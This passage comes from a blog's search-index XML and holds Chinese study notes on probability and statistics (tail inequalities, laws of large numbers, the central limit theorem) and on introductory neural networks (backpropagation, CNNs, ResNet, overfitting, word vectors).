id="置信区间-v-s-Bayes-区间"><a href="#置信区间-v-s-Bayes-区间" class="headerlink" title="置信区间 v.s. Bayes 区间"></a>置信区间 v.s. Bayes 区间</h3><ul><li><p>(置信区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $\hat\theta_1, \hat\theta_2$ 得到具体区间.</p><script type="math/tex; mode=display">  P(\hat\theta_1<\theta<\hat\theta_2)\ge 1-\alpha.</script></li><li><p>(<strong>Bayes</strong> 区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $a, b$ 得到具体区间.</p><script type="math/tex; mode=display">  P(a<\Theta<b\mid x_1,\cdots,x_n)\ge 1-\alpha.</script></li></ul><h3 id="小样本方法-v-s-大样本方法"><a href="#小样本方法-v-s-大样本方法" class="headerlink" title="小样本方法 v.s. 大样本方法"></a>小样本方法 v.s. 大样本方法</h3><ul><li>精确分布 <strong>v.s.</strong> 近似分布</li></ul><h3 id="Fisher-信息量"><a href="#Fisher-信息量" class="headerlink" title="Fisher 信息量"></a>Fisher 信息量</h3><script type="math/tex; mode=display">\dfrac{\theta^*-\theta}{\sigma_n}\stackrel{近似}{\sim}N(0,1).</script><script type="math/tex; mode=display">\sigma_n=\sqrt{\dfrac{1}{nI(\theta)}}或\sqrt{\dfrac{1}{nI(\theta^*)}}.</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记5</title>
      <link href="/2023/04/22/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-5/"/>
      <url>/2023/04/22/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-5-不等式与极限定理"><a href="#Chap-5-不等式与极限定理" class="headerlink" title="Chap 5 不等式与极限定理"></a>Chap 5 不等式与极限定理</h1><h2 id="概率不等式"><a href="#概率不等式" class="headerlink" title="概率不等式"></a>概率不等式</h2><ul><li><p><strong>定义(Markov 不等式)</strong>  $Y\ge 0$, $\forall\,a&gt;0$, 有</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(Y)}{a}.</script></li><li><p><strong>证明</strong>  令示性变量</p><script type="math/tex; mode=display">I=\begin{cases}1,Y\ge a;\\0,Y<a.\end{cases}</script><p>从而有 $I\le \dfrac{Y}{a}$, 两边取期望, 即得</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(Y)}{a}.</script></li><li><p><strong>定义(Chebyshev 不等式)</strong>  $Var(Y)$ 存在, $\forall\,a&gt;0$, 有</p><script type="math/tex; mode=display">P(\vert Y-E(Y)\vert\ge a)\le \dfrac{Var(Y)}{a^2}.</script></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  P(\vert Y-E(Y)\vert\ge a)&=P((Y-E(Y))^2\ge a^2)\\  &\le\dfrac{E[(Y-E(Y))^2]}{a^2}\\  &=\dfrac{Var(Y)}{a^2}.  \end{aligned}</script></li><li><p><strong>注</strong>  若 $Var(Y)=0$, 则 $P(Y=E(Y))=1$. ($Y=E(Y)$ $a.s.$)</p></li><li><p><strong>定义(Chernoff 不等式)</strong>  $\forall\,a&gt;0$, $t&gt;0$, 有</p><script type="math/tex; mode=display">P(Y\ge a)\le \dfrac{E(e^{tY})}{e^{ta}}.</script></li><li><p><strong>证明</strong>  注意到</p><script type="math/tex; mode=display">  \begin{aligned}  P(Y\ge a)&=P(e^{tY}\ge e^{ta})\,(保证\,e^{tY}>0)\\  &\le\dfrac{E(e^{tY})}{e^{ta}}.  \end{aligned}</script></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 估计 $P(\vert X\vert\ge 3)$.</p></li><li><p><strong>解答</strong>  我们有</p><script type="math/tex; mode=display">  P(\vert X\vert\ge 3)\le   \begin{cases}  \dfrac{E(\vert X\vert)}{3}=\dfrac{1}{3}\sqrt{\dfrac{2}{\pi}}\approx 0.27;\quad(Markov)\\  \dfrac{Var(X)}{3^2}=\dfrac{1}{9}\approx 0.11;\quad(Chebyshev)\\  \dfrac{2E(e^{tX})}{e^{3t}}=2e^{\tfrac{t^2}{2}-3t}\le 2e^{-\tfrac{9}{2}}\approx 0.02.\quad(Chernoff)  \end{cases}</script></li></ul><h2 id="大数定律-LLN"><a href="#大数定律-LLN" class="headerlink" title="大数定律 (LLN)"></a>大数定律 (LLN)</h2><ul><li><p><strong>定义</strong>  $X_1,X_2,\cdots$ <strong>iid</strong> (独立同分布), $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 定义:</p><script type="math/tex; mode=display">\overline{X}=\dfrac{1}{n}\sum_{i=1}^{n}X_i,\, E(\overline{X})=\mu,\,Var(\overline{X})=\dfrac{\sigma^2}{n}\rightarrow 0.</script></li><li><p><strong>定义(Khinchin 弱大数定律)(WLLN)</strong> </p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 则 $\forall\varepsilon&gt;0$, 有</p><script type="math/tex; mode=display">  \lim_{n\rightarrow\infty}P(\vert \overline{X}-\mu\vert\ge \varepsilon)=0.</script></li><li><p><strong>证明</strong>  我们有</p><script type="math/tex; mode=display">  P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\dfrac{Var(\overline{X})}{\varepsilon^2}=\dfrac{\sigma^2}{n\varepsilon^2}\rightarrow 0, 当\,n\rightarrow 0.</script></li><li><p><strong>注</strong></p><ul><li><p>$\mu\approx\overline{X}$ (在很大概率意义下可以用作样本均值估计);</p></li><li><p>$\forall\,\varepsilon&gt;0$, $\forall\,\alpha&gt;0$, $\exists N&gt;0$ 使得当 $n\ge N$ 时</p><script type="math/tex; mode=display">P(\vert \overline{X}-\mu\vert\ge \varepsilon)\le\alpha.</script><p>其中 $\varepsilon$ 体现了精度，$\alpha$ 体现了置信度.</p></li><li><p><strong>Bernoulli LLN</strong>: $X_i\sim B(p)$, 则特殊地得到 <strong>Bernoulli</strong> 大数定律。</p></li><li><p>方差有限条件可去掉, 结论依然成立;</p></li><li><p>可推广至不同的条件:</p><ul><li>$X_i$ 两两不相关,  $Var(X_i)$ 一致有界 (<strong>Chebyshev</strong>);</li><li>$Var(\overline{X})\rightarrow 0$ (<strong>Markov</strong>).</li></ul></li></ul></li><li><p><strong>定义(依概率收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{P}{\longrightarrow}Y\Longleftrightarrow\forall\varepsilon>0, \lim_{n\rightarrow\infty}P(\vert Y_n-Y\vert\ge\varepsilon)=0.</script></li><li><p><strong>注</strong>  <strong>WLLN</strong> $\Rightarrow\overline{X}\stackrel{P} {\longrightarrow}\mu$ (考虑偏差).</p></li><li><p><strong>定义(Kolmogov 强大数定律)(SLLN)</strong></p><p>  若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$. 则有</p><script type="math/tex; mode=display">  P(\omega\in\Omega\mid \lim_{n\rightarrow\infty}\overline{X_n}(\omega)=\mu)=P(\lim_{n\rightarrow\infty}\overline{X}=\mu)=1.</script></li><li><p><strong>注</strong>  若 $X_i\sim B(p)$ 则 $\overline{X}$ 为频率,从而概率的频率解释是合理的.</p></li><li><p><strong>定义(以概率 1 收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{a.s.}{\longrightarrow}Y\Longleftrightarrow P(\lim_{n\rightarrow\infty}Y_n=Y)=1.</script></li><li><p><strong>注</strong>  <strong>SLLN</strong> $\Rightarrow\overline{X}\stackrel{a.s.} {\longrightarrow}\mu$ (逐点考虑).</p></li><li><p><strong>例</strong>  (<strong>Monte Carlo</strong> 积分)</p></li><li><p><strong>解答</strong>  在 $[a,b]\times [0,c]$ 上取点 $(X_i,Y_i)$ <strong>iid</strong> 在矩形内均匀分布. 定义</p><script type="math/tex; mode=display">  I_i=  \begin{cases}  1,(X_i,Y_i)\in D;\\  0,(X_i,Y_i)\notin D.  \end{cases}</script><p>  则 $I_i\stackrel{iid} {\longrightarrow}B(p)$. 我们有</p><script type="math/tex; mode=display">  P=\dfrac{1}{(b-a)c}\int_a^bg(x)dx\approx\dfrac{1}{n}\sum_{i=1}^{n}I_i.</script></li><li><p><strong>例</strong>  两种收敛有什么差别?</p></li><li><p><strong>解答</strong>  考虑 $\Omega=[0,1]$ 均匀分布 (从而有 ($\Omega,\mathscr{F},P$)). 我们构造</p><script type="math/tex; mode=display">Y_1(\omega)=\omega+I_{[0,1]}(\omega)\\Y_2(\omega)=\omega+I_{[0,\frac{1}{2}]}(\omega)\\Y_3(\omega)=\omega+I_{[\frac{1}{2},1]}(\omega)\\Y_4(\omega)=\omega+I_{[0,\frac{1}{3}]}(\omega)\\Y_5(\omega)=\omega+I_{[\frac{1}{3},\frac{2}{3}]}(\omega)\\Y_6(\omega)=\omega+I_{[\frac{2}{3},1]}(\omega)\\\cdots\\Y(\omega)=\omega.</script><p>因此有 $Y_n\stackrel{P} {\longrightarrow}Y$, 但是 $Y_n\stackrel{a.s.} {\longrightarrow}Y$ 不成立.</p><p>这是因为 $\forall\,\omega_0\in(0,1)$, $Y_n(\omega_0)$ 是振荡的, 它的极限不存在.</p></li></ul><h2 id="中心极限定理-CLT"><a href="#中心极限定理-CLT" class="headerlink" title="中心极限定理 (CLT)"></a>中心极限定理 (CLT)</h2><ul><li><p><strong>定义(中心极限定理)(CLT)</strong></p><p>若 $X_1,X_2,\cdots$ <strong>iid</strong>, $E(X_i)=\mu$, $Var(X_i)=\sigma^2&gt;0$. 我们有</p><script type="math/tex; mode=display">\lim_{n\rightarrow\infty}P\left(\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}\le x\right)=\Phi(x),\,\forall\,x\in\mathbb{R}.</script><p>其中 $\Phi(x)$ 为 $N(0,1)$ 的 <strong>CDF</strong>. 也即</p><script type="math/tex; mode=display">\lim_{n\rightarrow\infty}P\left(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le x\right)=\Phi(x),\,\forall\,x\in\mathbb{R}.</script></li><li><p><strong>证明</strong>  只在 $X_i$ 的 <strong>MGF</strong> 存在情形下证明, 记 $M(t)=M_{X_i}(t)$.</p><p>  不失一般性地, 令 $\mu=0$, $\sigma^2=1$. 因此</p><script type="math/tex; mode=display">  M(0)=E(1)=1,\\  M'(0)=E(X_i)=\mu=0,\\  M''(0)=E(X_i^2)=\sigma^2=1.</script><p>  我们得到</p><script type="math/tex; mode=display">  \begin{aligned}  E(e^{t\frac{X_1+\cdots+X_n}{\sqrt{n}}})&=M^n(\tfrac{t}{\sqrt{n}})\\  &=\left(1+\tfrac{t^2}{2n}+o(\tfrac{t^2}{n})\right)^n\\  &\rightarrow e^{\tfrac{t^2}{2}}.  \end{aligned}</script></li></ul><ul><li><p><strong>注</strong></p><ul><li><p>上述 <strong>CLT</strong> 通常称为 <strong>Lindeberg-Levy CLT</strong>;</p></li><li><p><strong>CLT</strong> $\Rightarrow X_1+\cdots+X_n\sim N(n\mu,n\sigma^2)$, $\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n})$;</p></li><li><p><strong>(DeMoivre-Laplace CLT)</strong>  </p><p>  若 $X_i\sim B(p)$, 则 $\sum\limits_{i=1}^{n}X_i\sim B(n,p)\stackrel{CLT} {\longrightarrow}$ 正态分布.</p></li></ul></li><li><p><strong>定义(二项分布下 CLT 的连续性修正)</strong></p><p>我们有 $P(t_1\le\sum\limits_{i=1}^{n}X_i\le t_2)\approx\Phi(y_2)-\Phi(y_1)$. 其中</p><script type="math/tex; mode=display">\begin{cases}y_1=\dfrac{t_1-np-\tfrac{1}{2}}{\sqrt{np(1-p)}},\\y_2=\dfrac{t_2-np+\tfrac{1}{2}}{\sqrt{np(1-p)}}.\end{cases}</script><p>修正形式可计算单点 $P(S_n=k)$ 的概率, 对其他离散变量也同样适用.</p></li><li><p><strong>定义(依分布收敛)</strong></p><script type="math/tex; mode=display">Y_n\stackrel{d}{\longrightarrow}Y\Longleftrightarrow \lim_{n\rightarrow\infty}F_n(x)=F(x).</script></li></ul><ul><li><p><strong>注</strong>  <strong>CLT</strong> $\Rightarrow Z_n=\dfrac{X_1+\cdots+X_n-n\mu}{\sqrt{n}\sigma}=\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}$ (标准化).</p></li><li><p><strong>例(选举问题)</strong>  设 $p$ 为选民支持率(未知), 随机调查 $n$ 个人, 支持比例为 $p_n=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i$, 其中 $X_i\sim B(p)$. 若 $\varepsilon=0.03$, $1-\alpha=0.95$, 求 $n$ 的取值.</p></li><li><p><strong>解答</strong>  有</p><script type="math/tex; mode=display">  P(\left|p_n-p\right|\ge\varepsilon)\le \alpha.</script><p>  由 <strong>CLT</strong> 可得</p><script type="math/tex; mode=display">  \begin{aligned}  P(\left|p_n-p\right|\ge\varepsilon)&=1-P\Big(-\dfrac{\sqrt{n}\varepsilon}{\sigma}\le\dfrac{p_n-p}{\tfrac{\sigma}{\sqrt{n}}}\le\dfrac{\sqrt{n}\varepsilon}{\sigma}\Big)\\  &=1-\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)+\Phi\Big(-\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\\  &=2-2\Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\le\alpha.  \end{aligned}</script><p>  即得</p><script type="math/tex; mode=display">  \Phi\Big(\dfrac{\sqrt{n}\varepsilon}{\sqrt{p(1-p)}}\Big)\ge 1-\dfrac{\alpha}{2}.</script><p>  为使得对任意 $p$ 成立, 取 $p=\dfrac{1}{2}$, 即有</p><script type="math/tex; mode=display">  \Phi\Big(2\sqrt{n}\varepsilon\Big)\ge 1-\dfrac{\alpha}{2}.</script><p>  注意到 $\Phi(1.96)\approx 0.975=1-\dfrac{\alpha}{2}$, 因此取 $n\ge 1068$ 即可 (与 $N$ 无关).</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="尾部概率控制"><a href="#尾部概率控制" class="headerlink" title="尾部概率控制"></a>尾部概率控制</h3><h3 id="极限定理"><a href="#极限定理" class="headerlink" title="极限定理"></a>极限定理</h3><ul><li><strong>LLN</strong>: 弱 or 强</li><li><strong>CLT</strong></li></ul><h3 id="三种收敛"><a href="#三种收敛" class="headerlink" title="三种收敛"></a>三种收敛</h3><h3 id="CLT-应用"><a href="#CLT-应用" class="headerlink" title="CLT 应用"></a><strong>CLT</strong> 应用</h3><script type="math/tex; mode=display">\begin{cases}X_1+\cdots+X_n\sim N(n\mu,n\sigma^2);\\\overline{X}\sim N(\mu,\dfrac{\sigma^2}{n}).\end{cases}</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability &amp; Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记2</title>
      <link href="/2023/04/17/ren-gong-zhi-neng-dao-lun-bi-ji-2/"/>
      <url>/2023/04/17/ren-gong-zhi-neng-dao-lun-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="第二章-神经网络和深度学习"><a href="#第二章-神经网络和深度学习" class="headerlink" title="第二章 神经网络和深度学习"></a>第二章 神经网络和深度学习</h1><h2 id="神经网络-——-从数字识别说起"><a href="#神经网络-——-从数字识别说起" class="headerlink" title="神经网络 —— 从数字识别说起"></a>神经网络 —— 从数字识别说起</h2><ul><li><p>深度学习 $\subseteq$ 机器学习 $\subseteq$ 人工智能.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959787.png" alt=""></p></li><li><p>$w_i(1\le i\le n)$ 表示<strong>数字模式</strong>, $x_i(1\le i\le n)$ 表示<strong>数字图像</strong>, 大小表示<strong>匹配程度</strong>.</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i.</script></li><li><p><strong>Sigmoid 函数</strong>: 评判<strong>匹配的程度</strong>, 将匹配结果变换到 0~1 之间.</p><script type="math/tex; mode=display">  \sigma(net)=\dfrac{1}{1+e^{-net}}.</script></li><li><p><strong>增加偏置项</strong>: 使 <strong>Sigmoid</strong> 函数平移.</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i+b;\\  y=sigmoid(net).</script><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959788.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959789.png" alt=""></p></li><li><p><strong>神经元</strong>代表一个<strong>模式</strong>, 其输出为匹配结果.</p></li><li><p><strong>神经网络的扩展</strong>:</p><ul><li><p><strong>横向</strong> —— 增加模式.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959790.png" alt=""></p></li><li><p><strong>纵向</strong> —— 局部模式.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959791.png" alt=""></p></li><li><p><strong>网络更深</strong> —— 模式组合.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959792.png" alt=""></p></li></ul></li><li><p><strong>获得模式</strong>:</p><ul><li>模式通过神经元的<strong>连接权重</strong>表示.</li><li>通过训练样本, <strong>自动学习</strong>权重 (模式), 不是人工设计.</li><li>学习到的模式是一种<strong>隐含表达</strong>.</li></ul></li></ul><h2 id="神经元与神经网络"><a href="#神经元与神经网络" class="headerlink" title="神经元与神经网络"></a>神经元与神经网络</h2><ul><li><p>神经元:</p><script type="math/tex; mode=display">  net=\sum_{i=1}^{n}w_i\cdot x_i+b=\sum_{i=0}^{n}w_i\cdot x_i;\\  o=g(net).</script><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959793.png" alt=""></p></li><li><p><strong>激活函数</strong>:</p><ul><li><p>符号函数.</p></li><li><p><strong>Sigmoid</strong> 函数.</p></li><li><p>双曲正切函数.</p></li><li><p><strong>ReLU</strong> 函数.</p></li><li><p><strong>Softmax</strong> 函数.</p><script type="math/tex; mode=display">  o_k=\dfrac{e^{net_k}}{\sum\limits_{i=1}^{m}e^{net_i}}.</script><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959794.png" alt=""></p></li></ul></li></ul><h2 id="如何训练神经网络"><a href="#如何训练神经网络" class="headerlink" title="如何训练神经网络"></a>如何训练神经网络</h2><ul><li><p><strong>建立数据集 (以动物识别为例)</strong>:</p><ul><li>收集各种动物的照片:<ul><li>不同姿势.</li><li>不同角度.</li><li>不同大小.</li></ul></li><li>数据标注:<ul><li>每张照片标注上动物的名称.</li></ul></li><li>训练集与测试集:<ul><li>样本.</li></ul></li></ul></li><li><p><strong>训练网络</strong>: 调整神经元权重.</p></li><li><p><strong>评价效果</strong>: 损失函数.</p></li><li><p><strong>误差平方和损失函数</strong>:</p><ul><li><p>用于<strong>输出是具体数值</strong>的问题.</p></li><li><p>对样本 $d$ 的误差:</p><script type="math/tex; mode=display">  E_d(w)=\dfrac{1}{2}\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script></li><li><p>对所有样本的误差:</p><script type="math/tex; mode=display">  E(w)=\sum_{d=1}^{n}E_d(w)=\dfrac{1}{2}\sum_{d=1}^{n}\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959795.png" alt=""></p></li></ul></li><li><p><strong>梯度下降法</strong>:</p><ul><li><p>迭代公式: 对<strong>权重求导</strong>, 作为下降的梯度大小.</p><script type="math/tex; mode=display">  w_i^{new}=w_i^{old}+\Delta w_i,\,\Delta w_i=-\eta\dfrac{\part E(w)}{\part w_i}.\\  \Rightarrow w^{new}=w^{old}+\Delta w,\,\Delta w=-\eta\nabla_wE(w)=-\eta\big[\dfrac{\part E(w)}{\part w_i}\big]_{1\le i\le n}.</script></li><li><p>梯度下降<strong>算法</strong>:</p><ul><li>批量梯度下降算法.</li><li>随机梯度下降算法.</li><li>小批量梯度下降算法.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959796.png" alt=""></p></li><li><p><strong>输出层</strong> (只影响<strong>一个输出</strong>):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959797.png" alt=""></p></li><li><p><strong>隐含层</strong> (影响<strong>多个输出</strong>):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959798.png" alt=""></p></li><li><p>整体梯度计算:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959799.png" alt=""></p></li></ul></li><li><p><strong>反向传播算法 (BP算法)</strong>: 随机梯度下降算法的一种实现.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959800.png" alt=""></p><ul><li>随机梯度下降版: <strong>初始化所有权值为小的随机值</strong>, 如 $[-0.05,0.05]$.</li><li>算法条件:<ul><li><strong>全连接</strong>网络.</li><li>批量、小批量梯度下降算法.</li><li>激活函数: <strong>Sigmoid</strong> 函数.</li><li>损失函数: <strong>误差平方和</strong>.</li></ul></li></ul></li><li><p><strong>交叉熵损失函数</strong>:</p><script type="math/tex; mode=display">  H_d(w)=-\sum_{k=1}^{M}t_{kd}\log o_{kd}.\\  H(w)=\sum_{d=1}^{N}H_d(w)=-\sum_{d=1}^{N}\sum_{k=1}^{M}t_{kd}\log o_{kd}.</script><p>  其中 $t_{kd}$ 为样本的<strong>希望</strong>输出值, $o_{kd}$ 为样本的<strong>实际</strong>输出值, 需要为概率值. 这给出了<strong>两个不同的概率分布间的距离</strong>. 对于<strong>分类问题</strong>, 对于给定输入样本 $d$, 只有 $d$ 对应的希望输出为 1, 其他为 0. 此时</p><script type="math/tex; mode=display">  H_d(w)=-\log o_{kd}.\\</script><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959801.png" alt=""></p></li></ul><h2 id="卷积神经网络-CNN"><a href="#卷积神经网络-CNN" class="headerlink" title="卷积神经网络 (CNN)"></a>卷积神经网络 (CNN)</h2><ul><li><p><strong>全连接网络</strong>的不足:</p><ul><li>连接<strong>权重过多</strong>.</li><li>影响<strong>训练速度</strong>.</li><li>影响<strong>使用速度</strong>.</li></ul></li><li><p><strong>卷积神经网络</strong>的特点:</p><ul><li><strong>参数少</strong>, 只与卷积核的大小和数量有关.</li><li>具有<strong>特征抽取</strong>能力.</li><li>特征的<strong>平移不变性</strong> (一定程度上).</li></ul></li><li><p>提取局部模式:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959802.png" alt=""></p><ul><li><p><strong>局部连接</strong>, <strong>权值共享</strong>.</p></li><li><p>卷积核训练通过 <strong>BP</strong> 算法进行.</p></li><li><p><strong>多卷积核</strong>: 一个卷积核产生一个通道, 输出的<strong>通道数</strong>等于<strong>卷积核数</strong>.</p></li><li><p><strong>多输入通道</strong> (例: <strong>RGB</strong> 识别):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959803.png" alt=""></p><p>  此时视为<strong>多厚度单卷积核</strong>.</p></li><li><p><strong>卷积核大小</strong>: 多层小卷积实现大卷积 (两层 3×3 卷积等效 5×5 卷积).</p></li><li><p><strong>池化</strong>: 一种<strong>降维</strong>的手段 (最大池化/平均池化), 池化<strong>不改变通道数</strong>.</p></li><li><p>卷积核具有<strong>抽取特征</strong>的能力.</p></li></ul></li><li><p><strong>LeNet 神经网络</strong> (数字识别):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959804.png" alt=""></p></li><li><p><strong>VGG-16 神经网络</strong> (图像识别):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959805.png" alt=""></p></li></ul><h2 id="梯度消失问题"><a href="#梯度消失问题" class="headerlink" title="梯度消失问题"></a>梯度消失问题</h2><ul><li><p>网络深度过深时:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959806.png" alt=""></p></li><li><p>使用 <strong>ReLU</strong> 激活函数, 其导数恒为 1:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959807.png" alt=""></p></li><li><p><strong>GoogLeNet 神经网络</strong> (类比高楼供水系统):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959808.png" alt=""></p><p>  神经元依靠<strong>就近输出</strong>进行<strong>训练</strong>时的<strong>梯度计算补偿</strong>, 训练结束后只采用最终输出.</p><ul><li><p><strong>Inception 模块</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959809.png" alt=""></p><p>  同时使用<strong>不同大小的卷积核.</strong></p></li><li><p><strong>降维 Inception 模块</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959810.png" alt=""></p><p>  <strong>使用 1×1 卷积降维</strong>.</p></li><li><p><strong>Inception 模块详析</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959811.png" alt=""></p></li></ul></li><li><p><strong>ResNet 残差网络</strong>:</p><ul><li><p>神经网络的<strong>退化</strong>现象 (与<strong>网络结构</strong>有关):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959812.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959813.png" alt=""></p></li><li><p>残差模块:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959814.png" alt=""></p><p>  <strong>恒等映射</strong>的存在<strong>解决了梯度消失问题</strong>.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959815.png" alt=""></p></li></ul></li></ul><h2 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h2><ul><li><p>神经网络的<strong>过拟合</strong>问题 (<strong>与网络结构无关, 与训练轮次有关</strong>):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959816.png" alt=""></p></li><li><p><strong>使用验证集</strong>: 用于调整超参数.</p></li><li><p><strong>限制模型的复杂性</strong>:</p><ul><li><p><strong>正则化项法</strong>: 考虑误差平方和损失函数:</p><script type="math/tex; mode=display">  E_d(w)=\sum_{k=1}^{m}(t_{kd}-o_{kd})^2.</script><p>  加入正则化项用于<strong>降低模型复杂性</strong>:</p><script type="math/tex; mode=display">  E_d(w)=\sum_{k=1}^{m}(t_{kd}-o_{kd})^2+\Vert w\Vert_2^2.</script><ul><li><p>2-范数: 很多参数值很小, 但基本不为 0, <strong>抗干扰能力强</strong>.</p></li><li><p>1-范数: 一些参数为 0, 起到<strong>特征选择</strong>的作用.</p></li></ul></li><li><p><strong>舍弃法</strong>: 随机地<strong>临时舍弃</strong>一些神经元.</p></li></ul></li><li><p><strong>增加数据量</strong>: 获得更多的数据.</p><ul><li><strong>数据增强法</strong>: 数据越多, 过拟合的风险就越小.</li></ul></li></ul><h2 id="词向量"><a href="#词向量" class="headerlink" title="词向量"></a>词向量</h2><ul><li><p>神经网络处理文本 (<strong>词&amp;文本</strong>) 的方法.</p></li><li><p><strong>独热编码 (one-hot)</strong>: 用与<strong>词表</strong>等长的<strong>向量</strong>表示一个词, 只有一个元素为 1.</p><ul><li>优点: 编码<strong>简单</strong>.</li><li>缺点: 编码太长, 无法度量词之间的<strong>相似性</strong> (例: <strong>2-范数度量</strong>).</li></ul></li><li><p><strong>分布式表示</strong>: 相比于独热编码, 是一种稠密表示.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959817.png" alt=""></p></li><li><p><strong>词嵌入</strong>: 把词向量从高维空间嵌入到低维空间中的一个方法.</p></li><li><p><strong>神经网络语言模型</strong>: 用神经网络实现的语言模型.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959818.png" alt=""></p><p>  标准的<strong>全连接网络</strong> (<strong>前向神经网络</strong>):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959819.png" alt=""></p><p>  语言模型同时训练<strong>词向量</strong>和<strong>权重</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301959820.png" alt=""></p></li><li><p><strong>训练</strong>神经网络语言模型: 让<strong>联合概率最大化</strong>估计概率 (<strong>最大似然估计</strong>).</p><ul><li><p>联合概率分布一般含有参数.</p></li><li><p>通过<strong>最大似然方法</strong>估计联合概率的参数.</p></li><li><p>对于神经网络语言模型, 即是估计网络的参数值.</p></li><li><p><strong>损失函数</strong> (<strong>负对数似然函数</strong>):</p><script type="math/tex; mode=display">  -\sum_{w\in C}\log p(w=k\mid context(w),\theta).</script><p>  其中 $\theta$ 表示神经网络的所有参数, $C$ 为语料库.</p></li><li><p><strong>存在问题</strong>:</p><ul><li><strong>神经元个数</strong>等于<strong>词表长度</strong> $K$.</li><li>$m(n-1)$ 个输入, <strong>全连接参数多</strong>.</li></ul></li></ul></li><li><p><strong>训练</strong>词向量:</p><p>  <img 